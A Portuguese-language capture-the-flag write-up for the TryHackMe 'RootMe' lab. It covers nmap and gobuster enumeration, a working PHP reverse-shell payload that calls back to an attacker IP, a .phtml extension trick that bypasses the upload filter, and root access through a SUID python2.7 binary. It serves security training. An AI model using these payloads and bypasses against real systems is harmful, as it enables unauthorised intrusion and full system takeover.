# RootMe

**URL:** https://tryhackme.com/room/rrootme

**IP do target:** `10.65.161.253`

## 1. Reconhecimento

### 1.1 Nmap

Como é habitual em muitos CTFs, iniciamos a análise através de um **scan de reconhecimento**, com o objetivo de identificar os serviços disponíveis no alvo, as respetivas versões e outras informações que possam ser relevantes para a resolução do exercício.

Para tal, utiliza-se o **Nmap** através do seguinte comando:

```bash
nmap -sS -p- -sC -sV -O 10.65.161.253
```

Neste caso:

- `-sS` → realiza um **TCP SYN scan**, enviando pacotes SYN para verificar o estado das portas sem completar o handshake;
- `-p-` → indica que devem ser analisadas **todas as portas TCP**;
- `-sC` → executa o conjunto de scripts predefinidos, permitindo obter informação adicional sobre os serviços detetados, como banners, configurações e outras características relevantes;
- `-sV` → ativa a deteção de versões dos serviços, permitindo identificar não só o serviço associado a uma porta, como também a versão que está a ser utilizada;
- `-O` →  tenta realizar a deteção do sistema operativo através da análise das características da resposta da máquina alvo.

### Output

O comando produz o seguinte:

```text
Nmap scan report for 10.65.161.253
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0e:05:9c:b7:b9:22:ca:2d:6d:d5:fa:8d:b4:ac:f9:bc (RSA)
|   256 e4:87:09:c2:c1:e5:a8:06:ae:df:7e:42:b1:6c:72:7b (ECDSA)
|_  256 37:ea:14:5f:f1:84:70:57:6c:09:af:21:b5:46:20:f5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=9/23%OT=22%CT=1%CU=44770%PV=Y%DS=3%DC=I%G=Y%TM=6AB3DCD
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=108%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%G
OS:CD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.92 seconds
```

A partir do resultado, podemos identificar **duas portas** abertas:

- `22/tcp` → SSH: está a executar o OpenSSH 8.2p1 numa máquina Ubuntu. Este serviço poderá ser relevante posteriormente caso sejam obtidas credenciais válidas;
- `80/tcp` → HTTP: está disponível um servidor web **Apache 2.4.41**, também associado a Ubuntu. O título da página é HackIT - Home, indicando que existe uma aplicação web associada a este serviço.

Observa-se, também, a existência de um cookie denominado PHPSESSID, indincando que a aplicação web utiliza PHP.

Apesar de o Nmap tentar identificar o sistema operativo através da opção `-O`, neste caso não conseguiu determinar uma correspondência exata. Ainda assim, a informação recolhida pelos serviços permite inferir que o alvo está a executar Linux/Ubuntu, embora a deteção de SO deva ser encarada como uma indicação e não como uma confirmação.

Com base nesta enumeração inicial, o serviço HTTP na porta 80 permite aceder a uma aplicação web através do endereço:

```text
http://10.65.161.253
```

### 1.2 Gobuster

Para responder às questões seguintes, iremos realizar uma nova fase de **enumeração da aplicação web**, procurando ficheiros e diretorias que não estejam visíveis na página inicial. Para tal, utilizaremos o **Gobuster** com o seguinte comando:


```bash
gobuster dir -u 10.65.161.253 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,json
```

onde

- `dir` → indica ao Gobuster que pretendemos utilizar o modo de **enumeração de diretorias e ficheiros**;
- `-u 10.65.161.253` → especifica o **URL do alvo** onde será realizada a enumeração;
- `-w /usr/share/wordlists/dirb/common.txt` → define a **wordlist** utilizada durante o processo de enumeração;
- `-x php,html,txt,json` → especifica as **extensões de ficheiros** que devem ser testadas;

### Output

```text
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.161.253
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,json
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 278]
.hta.php             (Status: 403) [Size: 278]
.htaccess.txt        (Status: 403) [Size: 278]
.hta.json            (Status: 403) [Size: 278]
.hta.html            (Status: 403) [Size: 278]
.htaccess.html       (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htaccess.php        (Status: 403) [Size: 278]
.hta.txt             (Status: 403) [Size: 278]
.htaccess.json       (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
.htpasswd.html       (Status: 403) [Size: 278]
.htpasswd.json       (Status: 403) [Size: 278]
.htpasswd.php        (Status: 403) [Size: 278]
.htpasswd.txt        (Status: 403) [Size: 278]
css                  (Status: 301) [Size: 312] [--> http://10.65.161.253/css/]
index.php            (Status: 200) [Size: 616]
index.php            (Status: 200) [Size: 616]
js                   (Status: 301) [Size: 311] [--> http://10.65.161.253/js/]
panel                (Status: 301) [Size: 314] [--> http://10.65.161.253/panel/]
server-status        (Status: 403) [Size: 278]
uploads              (Status: 301) [Size: 316] [--> http://10.65.161.253/uploads/]
Progress: 23065 / 23065 (100.00%)
===============================================================
Finished
===============================================================
```

Alguns dos destaques deste output:

- `index.php` → **HTTP 200**, indica que a página existe e pode ser acedida diretamente;
- `css/` → **HTTP 301**, indica um redirecionamento para `/css/`, diretoria normalmente utilizado para armazenar os ficheiros de estilo da aplicação;
- `js/` → **HTTP 301**, indica um redirecionamento para `/js/`, onde poderão estar armazenados ficheiros JavaScript. A sua análise poderá revelar endpoints, parâmetros ou outras funcionalidades da aplicação;
- `panel/` → **HTTP 301**, indica um redirecionamento para `/panel/`. Este é um dos resultados mais relevantes, uma vez que o nome sugere a existência de um painel da aplicação. Será posteriormente realizada uma enumeração específica desta diretoria;
- `uploads/` → **HTTP 301**, indica um redirecionamento para `/uploads/`. A existência desta diretoria sugere a possibilidade da aplicação disponibilizar alguma funcionalidade de **upload de ficheiros**, pelo que deverá ser analisado com maior detalhe;
- vários ficheiros, como `.htaccess`, `.htpasswd` e `.hta`, devolvem **HTTP 403 (Forbidden)**, indica que o servidor reconhece estes recursos, mas impede o seu acesso;
- `server-status` → **HTTP 403**, indica que o endpoint existe ou é reconhecido pelo servidor Apache, mas o acesso encontra-se restringido;

Os resultados mais relevantes para a continuação da análise são, portanto, **`/panel/`** e **`/uploads/`**, uma vez que podem disponibilizar funcionalidades diretamente relacionadas com a aplicação e constituir potenciais pontos de entrada.

## 2. Reverse Shell

Dada a dificuldade deste CTF, o próprio título desta etapa dá uma pista sobre o que devemos procurar fazer: obter uma **reverse shell**.

De forma simples, **reverse shell** é uma ligação em que a máquina alvo inicia uma conexão de saída para a nossa máquina, permitindo-nos obter uma shell remota. Ao contrário de uma *bind shell*, em que o alvo fica à escuta de uma conexão externa, numa *reverse shell* é o próprio alvo que estabelece a ligação de volta para o atacante.

Para estabelecer esta ligação, são necessários essencialmente dois elementos:

1. **Um listener na nossa máquina**, responsável por aguardar a conexão proveniente do alvo;
2. **Um mecanismo no alvo** que permita iniciar uma conexão de saída e associar essa conexão a uma shell.

No contexto deste CTF, a aplicação web disponibiliza uma funcionalidade de **upload de ficheiros**, que poderá permitir a execução de código no servidor. Caso consigamos executar código no alvo, podemos utilizá-lo para iniciar uma conexão de volta para a nossa máquina e, consequentemente, obter uma shell.

> **Nota:** Antes de tentar estabelecer a reverse shell, é necessário garantir que o alvo consegue alcançar a nossa máquina. Para isso, devemos identificar o endereço IP da nossa interface de rede utilizada para a ligação ao ambiente do CTF, bem como escolher uma porta onde iremos colocar o listener. Por exemplo, podemos verificar o endereço IP da interface `tun0` com:

```bash
ip addr show tun0
```

Para colocar a nossa máquina à escuta numa determinada porta, utilizamos o **Netcat**, uma ferramenta de rede simples que permite estabelecer e receber conexões através de diferentes protocolos, sendo frequentemente utilizada para testar ligações e, em CTFs, para criar listeners e receber reverse shells.

```bash
nc -lvnp 4242
```

Neste comando:

- `-l` → coloca o Netcat em modo **listen**, aguardando por uma conexão;
- `-v` → ativa o modo **verbose**, apresentando informação adicional sobre a conexão;
- `-n` → evita a resolução de nomes DNS;
- `-p 4242` → define a porta `4242` como a porta onde iremos aguardar pela conexão.

Com o listener ativo, o próximo passo consiste em executar, no alvo, código que estabeleça uma conexão para o nosso endereço IP e porta `4242`, associando essa conexão a uma shell.

> **Nota:** Para este exemplo, utilizamos a porta `4242` para aguardar por uma ligação. Contudo, não estamos limitados a esta porta. Podemos utilizar qualquer outra porta disponível, desde que não esteja a ser utilizada por outro serviço na nossa máquina e que seja permitida pela configuração de rede.

Com isto em mente, é importante distinguir **obter uma reverse shell** de **obter privilégios elevados**. A reverse shell permite-nos obter acesso remoto ao sistema com os mesmos privilégios do processo que a iniciou. Por exemplo, se o código for executado pelo utilizador `www-data`, a shell será inicialmente obtida com os privilégios desse utilizador.

Como suspeitamos que o webserver utiliza/executa php podemos comecar por tentar criar um script em php que nos permita obter uma shell e submete-lo via o painel do website.

> **Nota:** O script utilizado pode ser obtido através de diferentes fontes. O Kali Linux disponibiliza ferramentas como o **msfvenom**, que permitem gerar payloads de forma automatizada. Em alternativa, existem repositórios como o [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), que oferecem diversos exemplos que podem ser úteis na resolução de exercícios de **Capture The Flag**. 

Neste caso em particular foi utilizado o seguinte payload:

```php
<?php
$sock = fsockopen("192.168.141.115", 4242);

$process = proc_open(
    "/bin/sh -i",
    [
        0 => $sock,
        1 => $sock,
        2 => $sock
    ],
    $pipes
);

proc_close($process);
?>
```

A função `fsockopen()` é responsável por estabelecer uma **ligação TCP** para o endereço IP `192.168.141.115`, utilizando a porta `4242`:

```php
$sock = fsockopen("192.168.141.115", 4242);
```

O resultado da ligação é armazenado na variável `$sock`, que representa o **socket** utilizado para a comunicação entre a máquina alvo e a nossa máquina.

Neste caso, o endereço `192.168.141.115` corresponde à máquina que está à escuta e a porta `4242` corresponde à porta utilizada para receber a ligação.

De seguida, é utilizada a função `proc_open()` para iniciar um novo processo.

Neste caso, o processo iniciado é:

```bash
/bin/sh -i
```

O parâmetro `-i` indica que a shell deve ser executada em **modo interativo**, permitindo receber comandos e devolver os respetivos resultados.

A parte mais importante do código encontra-se na definição dos descritores:

```php
[
    0 => $sock,
    1 => $sock,
    2 => $sock
]
```

Os números correspondem aos três descritores padrão utilizados pelos processos em Linux:

- `0` → **stdin** — entrada do processo;
- `1` → **stdout** — saída normal do processo;
- `2` → **stderr** — saída de erro do processo.

Ao associar os três descritores ao socket `$sock`, a comunicação da shell passa a utilizar a ligação TCP previamente estabelecida.

Assim, os comandos recebidos através da ligação são encaminhados para o `stdin` da shell, enquanto o `stdout` e o `stderr` são enviados novamente através do mesmo socket.

Por fim, é utilizada a função `proc_close()`:

```php
proc_close($process);
```

Esta função aguarda pelo fim do processo iniciado através de `proc_open()` e, posteriormente, fecha os recursos associados ao processo.

De forma resumida, o payload funciona da seguinte forma:

1. `fsockopen()` → estabelece uma ligação TCP para `192.168.141.115:4242`;
2. `proc_open()` → inicia uma shell `/bin/sh -i`;
3. Os descritores `stdin`, `stdout` e `stderr` são associados ao socket;
4. A comunicação entre a shell e a máquina remota passa a ser realizada através dessa ligação;
5. `proc_close()` → trata do encerramento do processo quando a shell termina.

Com o payload preparado e com a nossa máquina à espera de uma conexão, passamos para o upload e execução do nosso script de reverse shell.


Ao submeter o script com a extensão `.php` através da página `/panel`, deparámo-nos com um aviso a indicar que não é permitido submeter ficheiros com esta extensão.

Perante esta limitação, surgem imediatamente duas hipóteses:

- procurar **extensões alternativas** que sejam aceites pela aplicação, mas que continuem a ser interpretadas pelo servidor como código PHP;
- reescrever o script noutra linguagem ou utilizar outro mecanismo que permita obter uma shell no sistema;

Começando pela primeira hipótese, existem várias extensões que podem, dependendo da configuração do servidor web, ser associadas ao interpretador PHP:

```text
.phtml
.php3
.php4
.php5
.php7
.phps
.phar
```

A aceitação destas extensões depende da configuração do servidor e da forma como a aplicação valida os ficheiros enviados. Assim, o facto de uma determinada extensão ser aceite pelo formulário de upload não significa necessariamente que o servidor a irá executar como PHP.

Neste caso, começámos por testar a extensão `.phtml`. Para isso, mantivemos o mesmo script utilizado anteriormente, alterando apenas a extensão do ficheiro:

```text
shell.phtml
```

Após submetermos novamente o ficheiro através da página `/panel`, verificámos que desta vez o upload foi aceite pela aplicação.

Podemos confirmar que o ficheiro foi efetivamente enviado para o servidor acedendo à diretoria `/uploads`.

Ao consultar esta diretoria, verificamos que o nosso ficheiro encontra-se disponível.

Uma vez que o ficheiro foi aceite e disponibilizado através de `/uploads`, podemos tentar executá-lo acedendo diretamente ao mesmo.

Entretanto, na nossa máquina já tínhamos iniciado um **listener** na porta `4242` através do Netcat:

Ao aceder ao ficheiro `shell.phtml`, observamos no terminal que o alvo estabeleceu uma ligação de volta para a nossa máquina:

```bash
listening on [any] 4242 ...
connect to [192.168.141.115] from (UNKNOWN) [10.65.161.253] 44492
/bin/sh: 0: can't access tty; job control turned off
$
```

A mensagem:

```text
connect to [192.168.141.115] from (UNKNOWN) [10.65.161.253] 44492
```

confirma que a máquina alvo `10.65.161.253` conseguiu estabelecer uma ligação TCP para a nossa máquina, neste caso através da porta `4242`.

A mensagem:

```text
/bin/sh: 0: can't access tty; job control turned off
```

indica que obtivemos uma shell interativa através de uma ligação que não está associada a um terminal TTY completo. Esta situação é comum ao obter uma reverse shell deste tipo e significa que algumas funcionalidades habituais de um terminal poderão não estar disponíveis.

Com a reverse shell estabelecida, podemos começar por identificar o utilizador responsável pela execução do processo através do comando `whoami`:

Ao que o resultado obtido foi:

```text
www-data
```

Isto significa que o código PHP foi executado pelo servidor web com os privilégios do utilizador `www-data`.

De seguida, vamos proceder à **enumeração do sistema de ficheiros**, com o objetivo de identificar ficheiros e diretorias relevantes até encontrarmos a nossa primeira flag, localizada num ficheiro chamado de `user.txt`.

## 3. Privilege Escalation

Nesta fase, o objetivo passa por obter **privilégios elevados**, idealmente uma shell com privilégios de `root`. Para isso, começamos por verificar se o utilizador atual possui permissões para executar comandos através do `sudo`.

O comando `sudo -l` permite consultar quais os comandos que o utilizador atual está autorizado a executar através do `sudo`. Em particular, procuramos entradas `NOPASSWD` ou comandos que possam ser executados como `root`.

No entanto, obtemos o seguinte resultado:

```text
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```

Esta mensagem está relacionada com o tipo de shell que obtivemos anteriormente. Como estamos a utilizar uma **reverse shell simples**, não dispomos inicialmente de um terminal interativo completo.

Neste caso, o `sudo` está a tentar solicitar a password do utilizador `www-data`, mas não consegue fazê-lo através da shell atual. Assim, esta mensagem **não significa necessariamente que o utilizador não tenha permissões de `sudo`**, mas que nas condições atuais, o comando não conseguiu concluir a operação porque não conseguiu obter a password através de um terminal.

Perante esta limitação, uma das opções passa por tentar melhorar a interatividade da shell através de um **pseudoterminal (PTY)**.

Nisto começamos por verificar se existe Python instalado no sistema:

```bash
python --version
```

O resultado indica que está disponível o **Python 2.7**.

Podemos então utilizar o módulo `pty` do Python para criar uma shell associada a um pseudoterminal:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

O módulo `pty` permite criar e gerir pseudoterminais, enquanto `pty.spawn()` inicia o `/bin/bash` utilizando esse mecanismo.

Após executar o comando, obtemos uma shell mais interativa. No entanto, ao voltarmos a executar:

```bash
sudo -l
```

é-nos solicitada a password do utilizador `www-data`.

Como não dispomos dessa password, e uma tentativa com uma password vazia não produziu resultados, decidimos continuar a enumeração do sistema à procura de outro vetor de **privilege escalation**.

Uma das verificações mais importantes nesta fase consiste em procurar ficheiros com o bit **SUID** ativo.

O bit SUID (*Set User ID*) permite que um executável seja executado com os privilégios do seu **proprietário**, em vez dos privilégios do utilizador que o executa.

Por exemplo, se um executável pertencer ao utilizador `root` e tiver o bit SUID ativo, a sua execução poderá ocorrer com os privilégios efetivos de `root`.

No entanto, a simples existência do bit SUID **não significa automaticamente que seja possível obter uma shell como `root`**. O resultado depende do comportamento do próprio executável e da forma como este gere os privilégios.

Assim, depois de identificar ficheiros SUID, é necessário analisar os executáveis encontrados e determinar se algum deles disponibiliza uma funcionalidade que possa ser utilizada como vetor de **privilege escalation**.

Para procurar ficheiros SUID em todo o sistema de ficheiros, utilizamos:

```bash
find / -type f -perm -u=s 2>/dev/null
```

Este comando pode ser dividido da seguinte forma:

- `find /` → inicia a pesquisa a partir de root (`/`) do sistema de ficheiros;
- `-type f` → limita os resultados a ficheiros regulares;
- `-perm -u=s` → procura ficheiros que tenham o bit SUID definido para o proprietário;
- `2>/dev/null` → redireciona as mensagens de erro para `/dev/null`, evitando que sejam apresentadas mensagens relacionadas com diretorias ou ficheiros aos quais não temos permissões de acesso.

O comando devolve a seguinte lista de ficheiros:

```text
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/bin/mount
/bin/su
/bin/fusermount
/bin/umount
```

Entre os resultados, existe um ficheiro que merece particular atenção:

```text
/usr/bin/python2.7
```

Ao contrário de muitos dos restantes executáveis, o `python2.7` é um interpretador que permite executar código. O facto de este binário possuir o bit SUID ativo torna-o particularmente relevante para o exercício, uma vez que poderá permitir executar código Python mantendo os privilégios efetivos associados ao proprietário do processo.

Para iniciar uma shell mantendo estes privilégios, executamos:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Neste comando, o parâmetro `-p` é particularmente importante, uma vez que permite à shell preservar os privilégios efetivos que foram herdados do processo que a iniciou.

De seguida, podemos confirmar o utilizador atual através do comando:

```bash
whoami
```

O resultado obtido é:

```text
root
```

Isto confirma que conseguimos obter uma shell com privilégios de `root`.

Com estes privilégios, passamos a ter acesso a recursos do sistema que anteriormente estavam restringidos ao utilizador `www-data`. Entre eles encontra-se o diretoria `/root`:

```bash
cd /root
ls -la
```

Ao enumerar o conteúdo deste diretoria, encontramos a **última flag do exercício**, concluindo assim a etapa de *privilege escalation* e a resolução do CTF.

## 4. Observações

> Depois de obter acesso ao sistema como `www-data`, começámos a procurar possíveis **vetores de privilege escalation** que nos permitissem obter acesso como `root`. Inicialmente, tentámos utilizar o `sudo -l`, mas as limitações da reverse shell e a ausência da password de `www-data` impediram-nos de explorar este caminho. Optámos então por enumerar ficheiros com o bit **SUID** ativo, onde encontrámos o `/usr/bin/python2.7` pertencente ao `root`. Esta configuração permitiu-nos executar Python com privilégios elevados e obter uma shell como `root`.
> Embora este tenha sido o caminho utilizado para concluir o exercício, poderiam ter sido explorados outros vetores de privilege escalation, como **tarefas agendadas através do `cron`**, ficheiros ou diretorias com permissões de escrita inadequadas, processos e serviços executados como `root`, credenciais armazenadas em ficheiros de configuração, variáveis de ambiente, outros binários **SUID/SGID** ou versões vulneráveis de software instalado.